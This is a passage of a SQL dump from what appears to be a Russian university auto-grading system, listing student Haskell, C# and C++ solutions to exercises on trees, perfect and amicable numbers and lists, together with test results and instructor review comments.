(2072, 63, '419046', '2012-10-14 20:15:49', 1, 'fives = [foldl (\r\nes x -> res * 10 + x) 0 (replicate n 5) | n <- [1..]]\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2073, 49, '442421', '2012-10-14 20:24:22', 1, '﻿using System;\r\n\r\nusing System.Collections;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _10._1\r\n\r\n{\r\n\r\n    public class Node\r\n\r\n    {\r\n\r\n        public int? val = null;\r\n\r\n        public Node Left = null;\r\n\r\n        public Node Right = null;\r\n\r\n    }\r\n\r\n    public class Tree : IEnumerable\r\n\r\n    {\r\n\r\n        public Node Root = null;\r\n\r\n\r\n\r\n        public bool Any(Func<Node, bool> b)\r\n           --- Это у вас получилась функция, которая, в принципе работает для любого Enumerable,\r\n           --- те мб имеет смысл сделать Node параметром generic и описать ее не в Tree, а отдельно\r\n        {\r\n\r\n            foreach (Node n in this)\r\n\r\n            {\r\n\r\n                if (b(n))\r\n\r\n                {\r\n\r\n                    return true;\r\n\r\n                }\r\n\r\n            }\r\n\r\n            return false;\r\n\r\n        }\r\n\r\n        public IEnumerator GetEnumerator()\r\n\r\n        {\r\n\r\n            Queue<Node> queue = new Queue<Node>();\r\n\r\n            queue.Enqueue(Root);\r\n\r\n            while (queue.Count > 0)\r\n\r\n            {\r\n\r\n                Node node = queue.Dequeue();\r\n\r\n                if (node.Left != null)\r\n\r\n                {\r\n\r\n                    queue.Enqueue(node.Left);\r\n\r\n                }\r\n\r\n                if (node.Right != null)\r\n\r\n                {\r\n\r\n                    queue.Enqueue(node.Right);\r\n\r\n                }\r\n\r\n                yield return node;\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Node r = new Node() { val = 2, Right = new Node() { val = 3, Left = new Node() {val = -1 }, Right = new Node() {val = 4 } } };\r\n\r\n            Tree t = new Tree() { Root = r };\r\n\r\n\r\n\r\n            Console.WriteLine(t.Any(n=> n.val==0));\r\n\r\n            Console.WriteLine(t.Any(n => n.val % 2 == 0));\r\n\r\n            Console.WriteLine(t.Any(n => n.val < 0));\r\n\r\n\r\n\r\n            Console.ReadKey();\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2074, 57, '787463', '2012-10-15 09:04:53', 1, 'removeValueFromList (x:xs) v\r\n  | x == v = xs\r\n  | otherwise = x : removeValueFromList xs v\r\n\r\nremoveValuesFromList xs [] = xs\r\nremoveValuesFromList xs (v:vs) = removeValuesFromList (removeValueFromList xs v) vs\r\n\r\ngenerateAllPairs [] = []\r\ngenerateAllPairs (x:xs) = (foldr (y res -> [x, y] : res) [] xs) ++ (generateAllPairs xs)\r\n\r\ngenerateSetsForNextStep xs =\r\n    let\r\n      f [x, y] res =\r\n        let\r\n          ys = removeValuesFromList xs [x, y]\r\n        in ((x + y) : ys) : ((x*y/(x + y)) : ys) : res\r\n    in foldr f [] (generateAllPairs xs)\r\n\r\ngenerateAllAchievableResistance [] = []\r\ngenerateAllAchievableResistance [r] = [r]\r\ngenerateAllAchievableResistance [x, y] = [x, y, x + y, x*y/(x+y)]\r\ngenerateAllAchievableResistance xs = foldr (ys res -> generateAllAchievableResistance ys ++ res) [] (generateSetsForNextStep xs)\r\n\r\ncontains xs x = foldr (||) False (map (==x) xs)\r\n\r\ncanMakeScheme rs r = contains (generateAllAchievableResistance rs) r', '<br/>Тесты успешно пройдены!'),
(2075, 56, '4837959', '2012-10-15 09:53:11', 1, 'allLists n 0 = [[]]\r\nallLists n k = [(x:xs) | x <- [1..n], xs <- (allLists n (k - 1))]', '<br/>Тесты успешно пройдены!'),
(2076, 57, 'tonyo', '2012-10-15 10:15:41', 0, 'getTotal [] = []\r\ngetTotal [x] = [x]\r\ngetTotal xs = getTotal1 xs [] []\r\n\r\ngetTotal1 [] [] _ = []\r\ngetTotal1 [] _ [] = []\r\ngetTotal1 [] l1 l2 = catScheme l1 l2\r\ngetTotal1 (x:xs) l1 l2 = getTotal1 xs (x:l1) l2 ++\r\n                         getTotal1 xs l1 (x:l2) ++\r\n                         getTotal1 xs l1 l2\r\n\r\n\r\ncatScheme l1 l2 = [x+y | x <- totl1, y <- totl2] ++\r\n                  [x*y/(y+x) | x <-totl1, y <-totl2] )\r\n    where totl1 = getTotal l1; totl2 = getTotal l2\r\n\r\ncanMakeScheme list n = any (eq n) (getTotal list)\r\n\r\neq n1 n2 = abs(n1-n2) < 0.001\r\n', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(2077, 57, 'tonyo', '2012-10-15 10:16:35', 0, 'getTotal [] = []\r\ngetTotal [x] = [x]\r\ngetTotal xs = getTotal1 xs [] []\r\n\r\ngetTotal1 [] [] _ = []\r\ngetTotal1 [] _ [] = []\r\ngetTotal1 [] l1 l2 = catScheme l1 l2\r\ngetTotal1 (x:xs) l1 l2 = getTotal1 xs (x:l1) l2 ++\r\n                         getTotal1 xs l1 (x:l2) ++\r\n                         getTotal1 xs l1 l2\r\n\r\n\r\ncatScheme l1 l2 = [x+y | x <- totl1, y <- totl2] ++\r\n                  [x*y/(y+x) | x <-totl1, y <-totl2]\r\n    where totl1 = getTotal l1; totl2 = getTotal l2\r\n\r\ncanMakeScheme list n = any (eq n) (getTotal list)\r\n\r\neq n1 n2 = abs(n1-n2) < 0.001\r\n', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 7'),
(2078, 57, 'tonyo', '2012-10-15 10:24:45', 1, 'getTotal [] = []\r\ngetTotal [x] = [x]\r\ngetTotal [x,y] = [x,y, x+y, x*y/(x+y) ]\r\ngetTotal xs = getTotal1 xs [] []\r\n\r\ngetTotal1 [] [] xs = xs\r\ngetTotal1 [] ys [] = ys\r\ngetTotal1 [] l1 l2 = catScheme l1 l2\r\ngetTotal1 (x:xs) l1 l2 = getTotal1 xs (x:l1) l2 ++\r\n                         getTotal1 xs l1 (x:l2) ++\r\n                         getTotal1 xs l1 l2\r\n\r\n\r\ncatScheme l1 l2 = [x+y | x <- totl1, y <- totl2] ++\r\n                  [x*y/(y+x) | x <-totl1, y <-totl2]\r\n    where totl1 = getTotal l1; totl2 = getTotal l2\r\n\r\ncanMakeScheme list n = any (eq n) (getTotal list)\r\n\r\neq n1 n2 = abs(n1-n2) < 0.001\r\n', '<br/>Тесты успешно пройдены!'),
(2079, 50, '51559263', '2012-10-15 10:36:45', 1, '#include < stdio.h >\r\n#include < iostream >\r\n\r\nusing namespace std;\r\n\r\nstruct tree\r\n{\r\n	tree ( int _val ) : val (_val), left(NULL), right(NULL)\r\n	{}\r\n\r\n	tree ( int _val, tree* l, tree* r ) : val(_val), left(l), right(r)\r\n	{}\r\n\r\n	int  val;\r\n	tree* left;\r\n	tree* right;\r\n};\r\n\r\ntemplate< typename T >\r\nbool Any ( tree* pt, T* f )\r\n   --- Лучше, на самом деле, тут const T& f\r\n   --- и тогда при вызове не надо будет писать амперсанд\r\n{\r\n	if ( (*f)(pt->val) )\r\n        return true;\r\n\r\n    if ( pt->left != NULL && pt->right == NULL )\r\n        return Any( pt->left, f );\r\n\r\n    if ( pt->left == NULL && pt->right != NULL )\r\n        return Any( pt->right, f );\r\n\r\n    if ( pt->left == NULL && pt->right == NULL )\r\n        return false;\r\n\r\n    return ( Any( pt->left, f ) || Any( pt->right, f ) );\r\n}\r\n\r\nbool check(int x) \r\n{\r\n	return x%3 == 0;\r\n}\r\n\r\nvoid main ()\r\n{\r\n	tree* pt = new tree( 22, new tree(99), NULL );\r\n\r\n	auto func = [](int x){return x%2 == 0;};\r\n\r\n	cout << Any( pt, &func ) << endl;\r\n	cout << Any( pt, &check ) << endl;\r\n	int c;\r\n	cin >> c;\r\n}', '<br/>Тесты успешно пройдены!'),
(2080, 57, '4837959', '2012-10-15 11:11:27', 0, 'canMakeScheme xs m = any (== m) $ generateSchemes xs (length xs)\r\n\r\ngenerateSchemes [x] 1 = [x]\r\ngenerateSchemes xs n = let  \r\n                            splited = [splitAt i xs | i <- [1..n - 1]]\r\n                            res = map ((x, y) -> generateConnections (generateSchemes x (length x))\r\n                                                                      (generateSchemes y (length y))\r\n                                      ) splited\r\n                       in foldr (++) [] res\r\n\r\ngenerateConnections xs ys = [direct (r1, r2) | r1 <- xs, r2 <- ys] ++\r\n                            [parallel (r1, r2) | r1 <- xs, r2 <- ys]\r\nparallel (r1, r2) = r1 * r2 / (r1 + r2)\r\ndirect (r1, r2) = r1 + r2', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 6'),
(2081, 49, 'jogrms', '2012-10-15 11:21:28', 1, 'using System;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    using IBN = BinaryNode<int>;\r\n\r\n    class BinaryNode<T>\r\n    {\r\n        public BinaryNode(T value, BinaryNode<T> left = null, BinaryNode<T> right = null) {\r\n            Value = value;\r\n            Left = left;\r\n            Right = right;\r\n        }\r\n\r\n        public bool any(Predicate<T> f) {\r\n            return f(Value) ? true :\r\n                ((Left == null ? false : Left.any(f))\r\n                || (Right == null ? false : Right.any(f)));\r\n        }\r\n\r\n        private BinaryNode<T> Left, Right;\r\n        private T Value;\r\n    }\r\n\r\n    class Program\r\n    {\r\n        static void Main(string[] args)\r\n        {\r\n            IBN root = new IBN(0, new IBN(1), new IBN(2));\r\n            System.Console.WriteLine(root.any(x => x > 0));\r\n            System.Console.WriteLine(root.any(x => x < 0));\r\n            System.Console.WriteLine(root.any(x => x == 0));\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(2082, 57, '4837959', '2012-10-15 11:22:43', 0, 'canMakeScheme xs m = any (ys -> any (== m) (generateSchemes ys (length ys))) $ permutations xs\r\n                  \r\ngenerateSchemes [x] 1 = [x]\r\ngenerateSchemes xs n = let  \r\n                            splited = [splitAt i xs | i <- [1..n - 1]]\r\n                            res = map ((x, y) -> generateConnections (generateSchemes x (length x))\r\n                                                                      (generateSchemes y (length y))\r\n                                      ) splited\r\n                       in foldr (++) [] res\r\n\r\ngenerateConnections xs ys = [direct (r1, r2) | r1 <- xs, r2 <- ys] ++\r\n                            [parallel (r1, r2) | r1 <- xs, r2 <- ys]\r\nparallel (r1, r2) = r1 * r2 / (r1 + r2)\r\ndirect (r1, r2) = r1 + r2', 'Не удалось вычислить выражение "canMakeScheme [4,4,5] 7", проверьте правильность синтаксиса'),
(2083, 18, '4837959', '2012-10-15 11:45:05', 1, 'canMakeScheme xs m = any (ys -> any (== m) (generateSchemes ys (length ys))) $ permutations xs\r\n\r\nselections [] = []\r\nselections (x:xs) = (x,xs) : [(y,x:ys) | (y,ys) <- selections xs]\r\npermutations [] = [[]]\r\npermutations xs = [y:zs | (y,ys) <- selections xs, zs <- permutations ys]\r\n\r\ngenerateSchemes [x] 1 = [x]\r\ngenerateSchemes xs n = let \r\n                           splited = [splitAt i xs | i <- [1..n - 1]]\r\n                           res = map ((x, y) -> generateConnections (generateSchemes x (length x))\r\n                                                                     (generateSchemes y (length y))\r\n                                     ) splited\r\n                       in foldr (++) [] res\r\n\r\ngenerateConnections xs ys = [direct (r1, r2) | r1 <- xs, r2 <- ys] ++\r\n                            [parallel (r1, r2) | r1 <- xs, r2 <- ys]\r\nparallel (r1, r2) = r1 * r2 / (r1 + r2)\r\ndirect (r1, r2) = r1 + r2', 'Не удалось вычислить выражение "f 1", проверьте правильность синтаксиса'),
(2084, 57, '4837959', '2012-10-15 11:45:23', 0, 'canMakeScheme xs m = any (ys -> any (== m) (generateSchemes ys (length ys))) $ permutations xs\r\n\r\nselections [] = []\r\nselections (x:xs) = (x,xs) : [(y,x:ys) | (y,ys) <- selections xs]\r\npermutations [] = [[]]\r\npermutations xs = [y:zs | (y,ys) <- selections xs, zs <- permutations ys]\r\n\r\ngenerateSchemes [x] 1 = [x]\r\ngenerateSchemes xs n = let \r\n                           splited = [splitAt i xs | i <- [1..n - 1]]\r\n                           res = map ((x, y) -> generateConnections (generateSchemes x (length x))\r\n                                                                     (generateSchemes y (length y))\r\n                                     ) splited\r\n                       in foldr (++) [] res\r\n\r\ngenerateConnections xs ys = [direct (r1, r2) | r1 <- xs, r2 <- ys] ++\r\n                            [parallel (r1, r2) | r1 <- xs, r2 <- ys]\r\nparallel (r1, r2) = r1 * r2 / (r1 + r2)\r\ndirect (r1, r2) = r1 + r2', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 7'),
(2085, 57, '4837959', '2012-10-15 11:53:18', 1, 'canMakeScheme xs m = any (ys -> any (== m) (generateSchemes ys (length ys))) $ permutations xs\r\n\r\nselections [] = []\r\nselections (x:xs) = (x,xs) : [(y,x:ys) | (y,ys) <- selections xs]\r\npermutations [] = [[]]\r\npermutations xs = [y:zs | (y,ys) <- selections xs, zs <- permutations ys]\r\n\r\ngenerateSchemes [x] 1 = [0, x]\r\ngenerateSchemes xs n = let \r\n                           splited = [splitAt i xs | i <- [1..n - 1]]\r\n                           res = map ((x, y) -> generateConnections (generateSchemes x (length x))\r\n                                                                     (generateSchemes y (length y))\r\n                                     ) splited\r\n                       in foldr (++) [] res\r\n\r\ngenerateConnections xs ys = [direct (r1, r2) | r1 <- xs, r2 <- ys] ++\r\n                            [parallel (r1, r2) | r1 <- xs, r2 <- ys]\r\nparallel (r1, r2) = r1 * r2 / (r1 + r2)\r\ndirect (r1, r2) = r1 + r2', '<br/>Тесты успешно пройдены!'),
(2086, 57, 'jogrms', '2012-10-15 14:59:58', 0, 'canMakeScheme xs r = any (== r) $ res xs where \r\n    res [x] = [x]\r\n    res (x:xs) = part [x] [] xs\r\n    \r\n    part _ [] [] = []\r\n    part i a [] = calc i a\r\n    part i a (t:ts) = part (t:i) a ts ++ part i (t:a) ts\r\n    \r\n    calc [i] [a] = [i + a, 1 / (1/i + 1/a)]\r\n    calc is as = concat [calc [x] [y] | x <- res is, y <- res as]\r\n', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 6'),
(2087, 57, 'jogrms', '2012-10-15 15:10:32', 2, '  --- Что-то видимо вы не все перебираете..\r\ncanMakeScheme :: [Rational] -> Rational -> Bool\r\ncanMakeScheme xs r = any (== r) $ (res xs :: [Rational]) where \r\n    res [x] = [x]\r\n    res (x:xs) = part [x] [] xs\r\n    \r\n    part _ [] [] = []\r\n    part i a [] = calc i a\r\n    part i a (t:ts) = part (t:i) a ts ++ part i (t:a) ts\r\n    \r\n    calc [i] [a] = [i + a, 1 / (1/i + 1/a)]\r\n    calc is as = concat [calc [x] [y] | x <- res is, y <- res as]', 'Выражение имеет неправильное значение: canMakeScheme [13, 7, 2, 3] 7'),
(2088, 61, '550896', '2012-10-15 16:50:35', 0, 'sumDiv :: Int -> Int\r\nsumDiv x = sum (getDivs x 2 [1])\r\n\r\ngetDivs :: Int -> Int -> [Int] -> [Int]\r\ngetDivs x ind a | ind >= x = a\r\ngetDivs x ind a | ((mod x ind) == 0) =\r\n  getDivs x (ind + 1) (ind : a) \r\ngetDivs x ind a = getDivs x (ind + 1) a\r\n \r\nperfects :: Int -> [Int]\r\nperfects x = perfects0 x 2 []\r\n\r\nperfects0 :: Int -> Int -> [Int] -> [Int]\r\nperfects0 x ind a | ind > x = a\r\nperfects0 x ind a | (sumDiv ind) == ind = \r\n  perfects0 x (ind + 1) (ind : a)\r\nperfects0 x ind a = perfects0 x (ind + 1) a', 'Выражение имеет неправильное значение: perfects 100'),
(2089, 61, '550896', '2012-10-15 16:52:29', 1, 'sumDiv :: Int -> Int\r\nsumDiv x = sum (getDivs x 2 [1])\r\n\r\ngetDivs :: Int -> Int -> [Int] -> [Int]\r\ngetDivs x ind a | ind >= x = a\r\ngetDivs x ind a | ((mod x ind) == 0) =\r\n  getDivs x (ind + 1) (a ++ [ind]) \r\ngetDivs x ind a = getDivs x (ind + 1) a\r\n \r\nperfects :: Int -> [Int]\r\nperfects x = perfects0 x 2 []\r\n\r\nperfects0 :: Int -> Int -> [Int] -> [Int]\r\nperfects0 x ind a | ind > x = a\r\nperfects0 x ind a | (sumDiv ind) == ind = \r\n  perfects0 x (ind + 1) (a ++ [ind])\r\nperfects0 x ind a = perfects0 x (ind + 1) a', '<br/>Тесты успешно пройдены!'),
(2090, 61, '318210', '2012-10-15 16:59:53', 1, '﻿--sumDiv n = foldl (+) 0 (filter (x -> n `mod` x == 0 ) [1..(n - 1)])\r\n\r\n\r\n\r\nsqrt2 n = sqrt3 n 1 0\r\n\r\nsqrt3 n k 1 = k\r\n\r\nsqrt3 n k b | b == 1 = k\r\n\r\n		| k * k > n = k - 1\r\n\r\n		| otherwise = sqrt3 n (k + 1) b \r\n\r\n\r\n\r\n--sumDiv n = sum (filter (x -> n `mod` x == 0 ) [1..(n - 1)])\r\n\r\n\r\n\r\nsumDiv n = sum ( filter (/=0) (map (x -> if (n `mod` x == 0 && x /= n) then (if (x /= n `div` x && x /= 1) then ( x + n `div` x) else (x)) else 0) [1..sqrt2(n)]))\r\n\r\n\r\n\r\n\r\n\r\n--perfects n = [i | i <- [1..n], i == sumDiv(i)]\r\n\r\nperfects n = filter (x -> x == sumDiv(x)) [1..n]\r\n\r\n\r\n\r\n---Последняя версия sumDiv хоть и по-больше, но работает быстрее.\r\n\r\n---Кажется то же самое можно через list comprehention сделать\r\n\r\n---обе версии perfects работают одинаково, хотя для совсем больших не проверял\r\n\r\n--- что можно было бы исправить или дополнить\r\n   --- Да мне кажется особо и нечего дополнять, все хорошо..\r\n   --- Еще быстрее можно было бы сосчитать сумму делителей, если воспользоваться формулами для суммы делителей,\r\n   --- использующей разложение на множители, но в данной задаче это вовсе не требовалось.. ', '<br/>Тесты успешно пройдены!'),
(2091, 62, '550896', '2012-10-15 17:08:35', 2, 'amicables :: Int -> [(Int, Int)]\r\namicables x = amicables0 x 1 1 []\r\n\r\namicables0 :: Int -> Int -> Int -> [(Int, Int)] -> [(Int, Int)]\r\namicables0 maxX x0 x1 pairs | x0 > maxX && x1 > maxX = pairs\r\namicables0 maxX x0 x1 pairs | x1 > maxX = \r\n  amicables0 maxX (x0 + 1) (x0 + 2) pairs\r\namicables0 maxX x0 x1 pairs | x1 > x0 && checkPair x0 x1 = \r\n  amicables0 maxX x0 (x1 + 1) (pairs ++ [(x0, x1)])\r\namicables0 maxX x0 x1 pairs = \r\n  amicables0 maxX x0 (x1 + 1) pairs\r\n\r\ncheckPair :: Int -> Int -> Bool\r\ncheckPair x y = (sumDiv x) == y && (sumDiv y) == x\r\n  --- Надо скопировать сюда текст sumDiv', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2092, 56, '550896', '2012-10-15 17:11:54', 1, 'allLists :: Int -> Int -> [[Int]]\r\nallLists n k = allLists0 [] n k\r\n\r\nallLists0 :: [[Int]] -> Int -> Int -> [[Int]]\r\nallLists0 a n k  | null a  = allLists0 (addToList n  []) n k\r\nallLists0 a n k  | k > (length (head a)) =\r\n  allLists0 (increaseList n a ) n k\r\nallLists0 a n k = a\r\n\r\nincreaseList :: Int -> [[Int]] -> [[Int]]\r\nincreaseList n a | null a = a\r\nincreaseList n a =\r\n (addToList n (head a)) ++ (increaseList n (tail a))\r\n\r\naddToList :: Int -> [Int] -> [[Int]]\r\naddToList n a = [ i : a | i <- [1..n]]', '<br/>Тесты успешно пройдены!'),
(2093, 63, '550896', '2012-10-15 17:25:33', 0, 'let five = [sum [5 * (10^i) | i <- [0..n]] | n <- [0..]]', 'Не удалось вычислить выражение "take 4 fives", проверьте правильность синтаксиса'),
(2094, 63, '550896', '2012-10-15 17:26:12', 1, 'let fives = [sum [5 * (10^i) | i <- [0..n]] | n <- [0..]]\r\n   --- OK, но let тут совсем ни к чему, просто fives = ...', 'Не удалось вычислить выражение "take 4 fives", проверьте правильность синтаксиса'),
(2095, 62, '550896', '2012-10-15 17:36:03', 1, 'amicables :: Int -> [(Int, Int)]\r\namicables x = amicables0 x 1 1 []\r\n\r\namicables0 :: Int -> Int -> Int -> [(Int, Int)] -> [(Int, Int)]\r\namicables0 maxX x0 x1 pairs | x0 > maxX && x1 > maxX = pairs\r\namicables0 maxX x0 x1 pairs | x1 > maxX = \r\n  amicables0 maxX (x0 + 1) (x0 + 2) pairs\r\namicables0 maxX x0 x1 pairs | x1 > x0 && checkPair x0 x1 = \r\n  amicables0 maxX x0 (x1 + 1) (pairs ++ [(x0, x1)])\r\namicables0 maxX x0 x1 pairs = \r\n  amicables0 maxX x0 (x1 + 1) pairs\r\n\r\ncheckPair :: Int -> Int -> Bool\r\ncheckPair x y = (sumDiv x) == y && (sumDiv y) == x\r\n\r\nsumDiv :: Int -> Int\r\nsumDiv x = sum (getDivs x 2 [1])\r\n\r\ngetDivs :: Int -> Int -> [Int] -> [Int]\r\ngetDivs x ind a | ind >= x = a\r\ngetDivs x ind a | ((mod x ind) == 0) =\r\n  getDivs x (ind + 1) (a ++ [ind]) \r\ngetDivs x ind a = getDivs x (ind + 1) a', '<br/>Тесты успешно пройдены!'),
(2096, 62, '318210', '2012-10-15 18:02:28', 1, 'sqrt2 n = sqrt3 n 1 0\r\n\r\nsqrt3 n k b | b == 1 = k\r\n\r\n		| k * k > n = k - 1\r\n\r\n		| otherwise = sqrt3 n (k + 1) b \r\n\r\n\r\n\r\nsumDiv n | n == 0 = -1\r\n\r\n	|otherwise =  sum ( filter (/=0) (map (x -> if (n `mod` x == 0 && x /= n) then (if (x /= n `div` x && x /= 1) then ( x + n `div` x) else (x)) else 0) [1..sqrt2(n)]))\r\n\r\n\r\n\r\nf n = filter (/= -1) (map (x -> if (x == sumDiv(sumDiv(x)) && x < sumDiv(x) ) then (x) else (-1)) [1..n])\r\n   --- Не очень важно, но тут можно использовать let, чтобы не считать sumDiv два раза \r\namicables n = [(i, sumDiv(i)) | i <- f n]\r\n', '<br/>Тесты успешно пройдены!'),
(2097, 61, '3742311', '2012-10-15 18:14:58', 1, 'sumDiv n = sum (filter (x -> mod n x == 0) [1..div n 2])\r\nperfects n = filter (x -> sumDiv x == x) [1..n]', '<br/>Тесты успешно пройдены!'),
(2098, 62, '3742311', '2012-10-15 18:19:46', 0, 'sumDiv n = sum (filter (x -> mod n x == 0) [1..div n 2])\r\namicables n = filter ((a,b) -> b <= n && sumDiv b == a) (map (x -> (x, sumDiv x)) [1..n])', 'Не удалось вычислить выражение "amicables 300", проверьте правильность синтаксиса'),
(2099, 62, '3742311', '2012-10-15 18:23:59', 1, 'sumDiv n = sum (filter (x -> mod n x == 0) [1..div n 2])\r\namicables n = filter ((a,b) -> a < b && b <= n && sumDiv b == a) (map (x -> (x, sumDiv x)) [1..n])\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2100, 63, '3742311', '2012-10-15 18:33:17', 1, 'fivesElement 1 = 5\r\nfivesElement n = 5 + 10 * fivesElement (n - 1)\r\nfives = map (x -> fivesElement x) [1,2..]', '<br/>Тесты успешно пройдены!'),
(2101, 63, '318210', '2012-10-15 18:34:20', 1, 'numbersFrom n = n : numbersFrom (10 * n + 5)\r\n\r\nfives = numbersFrom 5\r\n', '<br/>Тесты успешно пройдены!'),
(2102, 64, '550896', '2012-10-15 18:48:20', 2, 'foldTree :: (Int -> Int -> Int) -> Int -> Tree Int -> Int\r\nfoldTree op x t = foldTree0 op x (flatten t)\r\n\r\nfoldTree0 :: (Int -> Int -> Int) -> Int -> [Int] -> Int\r\nfoldTree0 op x a | null a = x\r\nfoldTree0 op x a = foldTree0 op (op x (head a)) (tail a)\r\n   --- Что-то у вас явно не дописано - не написано, что такое Tree, что такое flatten и т.д.\r\n   --- Напишите, пожалуйста.', '<br/>Тесты успешно пройдены!'),
(2103, 65, '550896', '2012-10-15 19:29:48', 2, 'cantor = [(i, j) | i <- [1..], j <-[1..]]\r\n  --- Нет, вот так - это неправильно, и это бы обсуждали на занятии ', 'Выражение имеет неправильное значение: length(filter(==(3,2))(take 100 cantor))'),
(2104, 50, '83813', '2012-10-15 19:36:41', 1, '#include <algorithm>\r\n\r\n#include <vector>\r\n\r\n#include <iostream>\r\n\r\n\r\n\r\nusing std::cerr;\r\n\r\n\r\n\r\nclass Tree {\r\n\r\n  int data_;\r\n\r\n  Tree *left_node_;\r\n\r\n  Tree *right_node_;\r\n\r\n\r\n\r\n public:\r\n\r\n  Tree() : data_(0), left_node_(NULL), right_node_(NULL)  {\r\n  }\r\n\r\n\r\n\r\n  Tree(const int data) : data_(data), left_node_(NULL), right_node_(NULL) {\r\n\r\n  }\r\n       --- Эти оба конструктора не очень нужны, достаточно задать умолчание для третьего конструктора. \r\n\r\n\r\n\r\n  Tree(const int data, Tree *left, Tree *right)\r\n   --- Тут const не очень нужен, обычно в таких ситуациях его не пишут\r\n      : data_(data),\r\n\r\n        left_node_(left),\r\n\r\n        right_node_(right) {\r\n\r\n  }\r\n\r\n\r\n\r\n  int GetData() const {\r\n\r\n    return data_;\r\n\r\n  }\r\n\r\n\r\n\r\n  Tree *GetLeftNode() {\r\n\r\n    return left_node_;\r\n\r\n  }\r\n\r\n\r\n\r\n  Tree *GetRightNode() {\r\n\r\n    return right_node_;\r\n\r\n  }\r\n\r\n\r\n\r\n};\r\n\r\n\r\n\r\n\r\n\r\ntemplate<class Predicate>\r\n\r\nbool Any(const Predicate &p, Tree *root) {\r\n\r\n  if (root == NULL) {\r\n\r\n    return false;\r\n\r\n  }\r\n\r\n  \r\n\r\n  return p(root->GetData()) || Any(p, root->GetLeftNode()) || Any(p, root->GetRightNode());\r\n\r\n}\r\n\r\n\r\n\r\nvoid OutTree(Tree *root) {\r\n     --- Немного лучше const Tree* root\r\n  cerr << "(";\r\n\r\n  if (root != NULL) {\r\n\r\n    cerr << root->GetData() << " : ";\r\n\r\n    OutTree(root->GetLeftNode());\r\n\r\n    OutTree(root->GetRightNode());\r\n\r\n  }\r\n\r\n  cerr << ")";\r\n\r\n}\r\n\r\n\r\n\r\nint main() {\r\n\r\n  std::vector<Tree *> nodes;\r\n\r\n  nodes.push_back(new Tree(5));\r\n\r\n  nodes.push_back(new Tree(3));\r\n\r\n  nodes.push_back(new Tree(7, nodes[0], nodes[1]));\r\n\r\n  nodes.push_back(new Tree(9));\r\n\r\n  nodes.push_back(new Tree(11, nodes[2], nodes[3]));\r\n\r\n\r\n\r\n  OutTree(nodes[4]);\r\n\r\n  cerr << std::endl;\r\n\r\n\r\n\r\n  cerr << "find even: " << Any([](int x) -> bool {\r\n\r\n      return x % 2 == 0;    \r\n\r\n    }, nodes[4]) << std::endl;\r\n\r\n\r\n\r\n  cerr << "find >10: " << Any([](int x) -> bool {\r\n\r\n      return x > 10;    \r\n\r\n    }, nodes[4]) << std::endl;\r\n\r\n\r\n\r\n  for (auto it = nodes.begin(); it != nodes.end(); ++it) {\r\n\r\n    delete *it;\r\n\r\n  }\r\n\r\n\r\n\r\n  return 0;\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2105, 59, '5772638', '2012-10-15 19:38:12', 1, ' class Program\r\n\r\n    {\r\n     \r\n        public static int [] nonZeroLastDigits( int[] numbs) \r\n        {\r\n            int[] b=numbs.Select(x=> x%10).Where(x=>x%10!=0).ToArray();\r\n            return b;\r\n        }\r\n\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            Random rand = new Random();\r\n            int[] numbs = new int[15];\r\n            for (int i = 1; i < 15; i++ ) \r\n            {\r\n                numbs[i] = rand.Next(1,1000);\r\n            }\r\n            int[] res = nonZeroLastDigits(numbs);\r\n            for (int i = 0; i < 15; i++) \r\n            {\r\n                Console.Write(numbs[i]+" ");\r\n            }\r\n            Console.WriteLine();\r\n            for (int i = 0; i < res.Length; i++)\r\n            {\r\n                Console.Write(res[i] + " ");\r\n            }\r\n            Console.ReadKey();\r\n        }\r\n    }', '<br/>Тесты успешно пройдены!');
INSERT INTO `solution` (`SolutionID`, `TaskID`, `UserID`, `LoadTimestamp`, `ResultID`, `Code`, `TestResult`) VALUES
(2106, 50, '3742311', '2012-10-15 19:38:15', 1, '#include "stdafx.h"\r\n#include <iostream>\r\n\r\nusing namespace std;\r\n\r\nclass BinaryTree {\r\npublic:\r\n    BinaryTree(int value, BinaryTree* left, BinaryTree* rigth):value(value), left(left), rigth(rigth)\r\n    {\r\n    }\r\n\r\n	template <class Pred>\r\n    bool AnyElement(Pred p)\r\n    {\r\n        return p(value) ||\r\n               left != 0 && left->AnyElement(p) ||\r\n               rigth != 0 && rigth->AnyElement(p);\r\n    }\r\n\r\nprivate:\r\n	int value;\r\n    \r\n    BinaryTree* left;\r\n    BinaryTree* rigth;\r\n};\r\n\r\nbool isEven(int n)\r\n{\r\n    return n % 2 == 0;\r\n}\r\n\r\n\r\nint _tmain(int argc, _TCHAR* argv[])\r\n{\r\n	BinaryTree* tree = new BinaryTree(3,\r\n		                              new BinaryTree(4, 0, 0),\r\n									  new BinaryTree(5, 0, 0));\r\n\r\n	cout<<tree->AnyElement(isEven);\r\n	return 0;\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(2107, 56, '318210', '2012-10-15 19:43:26', 1, 'allLists n k = allLists1 n k [[]]\r\n\r\nallLists1 n k sp| k == 0 = sp\r\n\r\n		| otherwise = allLists1 n (k - 1) [ s ++ [i] | i <- [1..n], s <- sp ]\r\n  --- Лучше не s ++ [i], а i:s. Нам ведь все равно, с какой стороны приписывать, а работает гораздо быстрее.\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
